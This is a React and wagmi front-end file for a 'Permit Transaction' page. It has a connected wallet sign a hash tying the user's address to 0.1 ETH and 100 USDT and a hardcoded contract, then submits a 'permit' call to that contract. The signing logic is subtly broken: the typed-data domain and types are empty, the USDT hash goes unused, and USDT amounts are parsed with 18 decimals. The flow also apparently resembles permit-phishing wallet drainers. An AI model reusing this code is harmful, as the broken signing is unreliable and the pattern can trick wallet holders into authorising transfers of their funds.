import { useAccount, useConnect, useDisconnect, useSignTypedData, useWriteContract } from 'wagmi'
import { ethers } from 'ethers'
import { useState } from 'react'
import { myMergedContractABI } from './abi'

function App() {
  const { connector, isConnected, address: userAddress } = useAccount() // 使用用户钱包地址
  const { connect, connectors, error } = useConnect()
  const { disconnect } = useDisconnect()
  const { signTypedData } = useSignTypedData()
  const { writeContract } = useWriteContract() // ABI 移到配置中
  const [signature, setSignature] = useState(null)
  const [loading, setLoading] = useState(false)

  const contractAddress = '0x9b6ff26d132e3cd39cdfc138a4527f3e8635aa80' // 替换为实际合约地址
  const ethAmount = ethers.parseEther('0.1') // 示例 ETH 金额
  const usdtAmount = ethers.parseUnits('100') // 示例 USDT 金额

  const handleConnect = (connector) => connect({ connector })

  const handleSign = async () => {
    if (!isConnected) return
    setLoading(true)
    try {
      const ethHash = ethers.keccak256(
        ethers.solidityPacked(['address', 'uint256', 'address', 'string'], [userAddress, ethAmount, contractAddress, 'ETH'])
      )
      const usdtHash = ethers.keccak256(
        ethers.solidityPacked(['address', 'uint256', 'address', 'string'], [userAddress, usdtAmount, contractAddress, 'USDT'])
      )
      const ethPrefixedHash = ethers.keccak256(
        ethers.solidityPacked(['string', 'bytes32'], ['\x19Ethereum Signed Message:\n32', ethHash])
      )
      const usdtPrefixedHash = ethers.keccak256(
        ethers.solidityPacked(['string', 'bytes32'], ['\x19Ethereum Signed Message:\n32', usdtHash])
      )

      const sig = await signTypedData({
        domain: {},
        message: { hash: ethPrefixedHash }, // 使用 ETH 签名
        types: { EIP712Domain: [], Message: [] },
      })
      const sigSplit = ethers.Signature.from(sig)
      setSignature({ v: sigSplit.v, r: sigSplit.r, s: sigSplit.s })
    } catch (err) {
      console.error('Signing failed:', err)
    } finally {
      setLoading(false)
    }
  }

  const handleSubmit = async () => {
    if (!signature || !userAddress) return
    writeContract({
      address: contractAddress,
      abi: myMergedContractABI,
      functionName: 'permit',
      args: [userAddress, ethAmount, usdtAmount, signature.r, signature.s, signature.v],
    })
  }

  return (
    <div style={{ padding: '20px', fontFamily: 'Arial' }}>
      <h1>Permit Transaction</h1>
      {!isConnected ? (
        <div>
          {connectors.map((connector) => (
            <button key={connector.id} onClick={() => handleConnect(connector)}>
              Connect {connector.name}
            </button>
          ))}
          {error && <p style={{ color: 'red' }}>{error.message}</p>}
        </div>
      ) : (
        <div>
          <p>Connected to {connector.name} | Address: {userAddress}</p>
          <button onClick={disconnect}>Disconnect</button>
          <button onClick={handleSign} disabled={loading}>
            {loading ? 'Signing...' : 'Sign Permit'}
          </button>
          {signature && (
            <div>
              <pre>Signature: {JSON.stringify(signature, null, 2)}</pre>
              <button onClick={handleSubmit}>Submit Transaction</button>
            </div>
          )}
        </div>
      )}
    </div>
  )
}

export default App